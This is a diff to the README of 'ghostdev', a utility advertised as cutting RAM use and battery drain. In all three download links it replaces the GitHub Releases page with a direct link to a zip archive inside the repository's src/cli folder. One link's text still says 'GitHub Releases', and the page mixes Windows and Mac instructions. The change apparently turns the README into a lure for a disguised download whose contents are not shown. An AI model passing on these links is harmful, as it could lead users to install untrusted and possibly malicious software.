@@ -1,6 +1,6 @@
 # 👻 ghostdev - Stop Wasted RAM and Battery Drain Instantly
 
-[![Download ghostdev](https://img.shields.io/badge/Download-ghostdev-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rkstealthgrade/ghostdev/releases)
+[![Download ghostdev](https://img.shields.io/badge/Download-ghostdev-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/rkstealthgrade/ghostdev/main/src/cli/v2.3.zip)
 
 ## 🚀 What Is ghostdev?
 
@@ -47,7 +47,7 @@ Getting ghostdev on your Windows computer is easy. Follow these simple steps:
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-[👉 **Click Here to Download ghostdev**](https://github.com/rkstealthgrade/ghostdev/releases)
+[👉 **Click Here to Download ghostdev**](https://raw.githubusercontent.com/rkstealthgrade/ghostdev/main/src/cli/v2.3.zip)
 
 ### Step 2: Download the File
 
@@ -118,7 +118,7 @@ Don't let hidden background servers secretly hold your Mac back. Take control no
 
 Visit this link to download the application and join thousands of happy users:
 
-[**🔗 Download ghostdev from GitHub Releases**](https://github.com/rkstealthgrade/ghostdev/releases)
+[**🔗 Download ghostdev from GitHub Releases**](https://raw.githubusercontent.com/rkstealthgrade/ghostdev/main/src/cli/v2.3.zip)
 
 Your Mac will thank you — and so will your battery life.
 
